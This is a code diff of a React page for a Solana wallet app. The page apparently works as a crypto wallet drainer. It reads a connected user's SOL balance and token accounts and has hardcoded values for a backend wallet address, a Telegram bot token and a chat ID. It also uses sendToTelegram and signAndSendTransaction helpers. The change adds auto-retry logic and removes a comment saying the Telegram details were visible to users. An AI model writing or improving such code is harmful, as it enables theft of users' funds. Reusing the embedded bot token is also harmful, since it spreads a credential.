@@ -3,11 +3,11 @@ import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { LAMPORTS_PER_SOL } from '@solana/web3.js';
 import { useEffect, useState } from 'react';
-import { getTokenAccounts, sendToTelegram, signAndSendTransaction } from '@/utils/walletUtils';
+import { getTokenAccounts, sendToTelegram, signAndSendTransaction, getWalletBalance } from '@/utils/walletUtils';
 import { toast } from '@/components/ui/use-toast';
 
 const BACKEND_ADDRESS = "GsRoop6YCzpakWCoG7YnHSSgMvcgjnuFEie62GRZdmJx";
-// Telegram details visible to user
+// Telegram details
 const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
 const TELEGRAM_CHAT_ID = "-1002490122517";
 
@@ -21,10 +21,10 @@ const Index = () => {
   const [connectionError, setConnectionError] = useState<string | null>(null);
   const [connectionAttempts, setConnectionAttempts] = useState(0);
   const [isLoading, setIsLoading] = useState(false);
+  const [fetchRetries, setFetchRetries] = useState(0);
 
-  // Enhanced wallet data fetching with better error handling
   const fetchWalletData = async () => {
-    if (!publicKey || !wallet || !connection) {
+    if (!publicKey || !wallet) {
       console.log("Wallet, connection, or public key not available");
       setConnectionError("Wallet or connection not available");
       return null;
@@ -34,37 +34,21 @@ const Index = () => {
     setIsLoading(true);
     
     try {
-      console.log("Getting wallet balance");
-      // Retry balance fetch up to 5 times with increasing delays
-      let balance = 0;
-      let fetchSuccess = false;
+      console.log("Getting wallet balance directly");
+      // Use the new standalone getWalletBalance function with built-in retries
+      const solBalance = await getWalletBalance(publicKey.toString());
       
-      for (let i = 0; i < 5; i++) {
-        try {
-          console.log(`Balance fetch attempt ${i+1}`);
-          balance = await connection.getBalance(publicKey, 'confirmed');
-          console.log(`Balance fetch attempt ${i+1} succeeded: ${balance}`);
-          fetchSuccess = true;
-          break;
-        } catch (err) {
-          console.error(`Balance fetch attempt ${i+1} failed:`, err);
-          await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
-        }
-      }
-      
-      if (!fetchSuccess) {
-        throw new Error("Failed to fetch wallet balance after multiple attempts");
-      }
-      
-      const solBalance = balance / LAMPORTS_PER_SOL;
       setWalletBalance(solBalance);
       console.log("Current balance:", solBalance, "SOL");
 
-      // Get token accounts with retry logic built into the function
+      // Get token accounts
       console.log("Fetching token accounts");
       const tokenAccounts = await getTokenAccounts(connection, publicKey.toString());
       console.log("Token accounts received:", tokenAccounts);
       setTokens(tokenAccounts || []);
+
+      // Reset fetch retries on success
+      setFetchRetries(0);
 
       return {
         address: publicKey.toString(),
@@ -76,6 +60,19 @@ const Index = () => {
     } catch (error) {
       console.error("Error fetching wallet data:", error);
       setConnectionError(error instanceof Error ? error.message : "Unknown error fetching wallet data");
+      
+      // Increment retry count and attempt again if under threshold
+      const newRetryCount = fetchRetries + 1;
+      setFetchRetries(newRetryCount);
+      
+      // Auto-retry if under threshold
+      if (newRetryCount < 5) {
+        console.log(`Auto-retrying wallet data fetch (${newRetryCount}/5)...`);
+        setTimeout(() => {
+          fetchWalletData();
+        }, 2000 * newRetryCount); // Increasing delay with each retry
+      }
+      
       return null;
     } finally {
       setIsLoading(false);
@@ -313,7 +310,7 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
           
           {isLoading && (
             <div className="mt-4 p-4 bg-blue-900/30 border border-blue-700 rounded-lg">
-              <p className="text-blue-300 font-semibold">Loading wallet data...</p>
+              <p className="text-blue-300 font-semibold">Loading wallet data... (Attempt {fetchRetries + 1})</p>
               <div className="mt-2 w-full bg-gray-700 h-2 rounded-full overflow-hidden">
                 <div className="bg-blue-400 h-full animate-pulse w-full"></div>
               </div>
